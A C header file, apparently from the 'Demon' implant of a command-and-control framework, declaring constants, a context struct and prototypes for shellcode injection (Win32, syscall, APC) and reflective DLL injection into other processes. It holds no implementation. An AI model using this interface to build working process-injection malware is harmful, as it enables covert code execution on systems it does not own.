
#ifndef DEMON_BASEINJECT_H
#define DEMON_BASEINJECT_H

#include <Demon.h>

// These are defined in the stdapi projects ps.h file. We should put them somewhere more generic so we dont dup them here.
#define PROCESS_ARCH_UNKNOWN				0
#define PROCESS_ARCH_X86					1
#define PROCESS_ARCH_X64					2
#define PROCESS_ARCH_IA64					3

#define INJECTION_TECHNIQUE_WIN32           1
#define INJECTION_TECHNIQUE_SYSCALL         2
#define INJECTION_TECHNIQUE_APC             3

#define SPAWN_TECHNIQUE_SYSCALL             2
#define SPAWN_TECHNIQUE_APC                 3

// defaults
#define SPAWN_TECHNIQUE_DEFAULT             SPAWN_TECHNIQUE_SYSCALL
#define INJECTION_TECHNIQUE_DEFAULT         INJECTION_TECHNIQUE_SYSCALL

typedef enum _DX_MEMORY
{
    DX_MEM_DEFAULT  = 0,
    DX_MEM_WIN32    = 1,
    DX_MEM_SYSCALL  = 2,
} DX_MEMORY;

typedef enum _DX_CREATE_THREAD
{
    DX_THREAD_DEFAULT           = 0,
    DX_THREAD_WIN32             = 1,
    DX_THREAD_SYSCALL           = 2,
    DX_THREAD_APC               = 3,
    DX_THREAD_WOW               = 4,
    DX_THREAD_SYSAPC            = 5,
} DX_THREAD;

typedef struct INJECTION_CTX
{
    HANDLE  hProcess;
    DWORD   ThreadID;
    DWORD   ProcessID;
    HANDLE  hThread;
    SHORT   Arch;
    BOOL    PipeStdout;

    BOOL    SuspendAwake;
    LPVOID  Parameter;
    SIZE_T  ParameterSize;

    SHORT   Technique;
} INJECTION_CTX, *PINJECTION_CTX ;

// ShellcodeInjectDispatch
BOOL  ShellcodeInjectDispatch( BOOL Inject, SHORT InjectionMethod, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
BOOL  ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );
DWORD DllSpawnReflective( LPVOID lpDllBuffer, DWORD dwDllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx );

#endif
